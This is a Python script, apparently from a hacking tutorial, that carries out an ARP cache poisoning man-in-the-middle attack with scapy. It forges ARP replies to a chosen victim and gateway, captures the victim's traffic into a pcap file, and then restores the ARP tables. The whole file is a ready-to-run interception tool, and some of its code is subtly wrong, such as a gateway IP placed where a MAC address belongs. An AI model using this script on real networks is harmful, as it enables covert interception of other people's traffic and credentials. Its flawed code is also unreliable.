from multiprocessing import Process, process

from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)

import os

import sys

import time

from color import *


def Print(string):
    print(f"[+]══════════════[ {string} ]════════════════[+]")

def get_mac(targetip):

    # create an ethernet frame look at figure 1

    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip)

    # Send and receive packets at layer 2

    resp, _ =srp(packet, timeout=2, retry=10, verbose=False)

    for _, r in resp:

        # get the mac address of the target IP

        return r[Ether].src

    return None

    

class Arper():

    # Define the constructor

    def __init__(self, victim, gateway, interface='eth0'):

        # victim IP

        self.victim = victim

        # vitim MAC address

        self.victimmac = get_mac(victim)

        # Gateway IP

        self.gateway = gateway

        # Gateway MAC address

        self.gatewaymac = get_mac(gateway)

        # NIC (Network Interface Card, for example eth0, wlan0)

        self.interface = interface

        # Related to scapy library

        conf.iface = interface

        conf.verb = 0

        # Print Information To STDOUT
        Print("Start Arp")
        print(f"Initialized {interface}: ")

        print(f"Gateway {gateway} is at {self.gatewaymac} ")

        print(f"Victim {victim} is at {self.victimmac} ")

        print("═"*50)



    # This function Launch the attack

    # It's a multithreaded function 

    # First thread will execute the poisoner 

    # Second thread will execute the Sniffer

    # sniffer used to show progress

    def run (self):

        self.poison_thread = Process(target=self.poison)

        self.poison_thread.start()



        self.sniff_thread = Process(target=self.sniff)

        self.sniff_thread.start()





    # Create and send poisoned packets

    # used to trick victims

    # and poison the arp cache table

    def poison(self):



        # ARP packet to poison the victim

        poison_victim = ARP()

        poison_victim.op = 2

        # ARP packet source IP

        poison_victim.psrc = self.gateway

        # ARP packet destination IP

        poison_victim.pdst = self.victim

        # ARP packet destination (victim) Mac Address

        poison_victim.hwdst = self.victimmac

        print(f"IP Source: {poison_victim.psrc}")

        print(f"IP Destination: {poison_victim.pdst}")

        print(f"MAC Destination: {poison_victim.hwdst}")

        # The attacker MAC address

        # replace the Gateway MAC address

        print(f"MAC Source: {poison_victim.hwsrc}")

        print(poison_victim.summary())

        print("═"*50)



         # ARP packet to poison the gateway

        poison_gateway = ARP()

        poison_gateway.op = 2

        # ARP packet source IP

        poison_gateway.psrc = self.victim

        # ARP packet destination IP

        poison_gateway.pdst = self.gateway

        # ARP packet destination (victim) Mac Address

        poison_gateway.hwdst = self.gateway

        print(f"IP Source: {poison_gateway.psrc}")

        print(f"IP Destination: {poison_gateway.pdst}")

        print(f"MAC Destination: {poison_gateway.hwdst}")

        # The attacker MAC address

        # replace the victim MAC address

        print(f"MAC Source: {poison_gateway.hwsrc}")

        print(poison_gateway.summary())

        print("═"*50)



        print("Start Poisining:[ctrl-c to stop]")



        while True:
            
            sys.stdout.write('=')
            sys.stdout.flush()

            try:

                # send poisned ARP packets

                send(poison_victim)

                send(poison_gateway)

            except KeyboardInterrupt:

                self.restore()
                sys.stdout.write(']')
                sys.exit()
            else:

                time.sleep(2)

        



    # Sniffer

    def sniff(self, count=100):

        time.sleep(5)

        print(f"Sniffing {count} packets")

        bpf_filter = "ip host %s" % self.victim

        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)

        wrpcap('arper.pcap', packets)

        print("Got the packets")

        self.restore()

        self.poison_thread.terminate()

        print("Finished.")

    

    def restore(self):

        print("Restoring ARP tables ... ")

        # brodcast ARP packets

        

        # to restore the arp cache table

        # at the victim 

        send(ARP(op=2,

        psrc=self.gateway,

        hwsrc =self.gatewaymac,

        pdst=self.victim,

        hwdst='ff:ff:ff:ff:ff:ff',

        count=5))



        # to restore the arp cache table

        # at the gateway

        send(ARP(op=2,

        psrc=self.victim,

        hwsrc =self.victimmac,

        pdst=self.gateway,

        hwdst='ff:ff:ff:ff:ff:ff',

        count=5))



# Get argument from STDIN

if __name__ == '__main__':

    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])

    try:

        myarp = Arper(victim, gateway, interface)

        myarp.run()

    except:

        print(red("[-]Error[-]"))
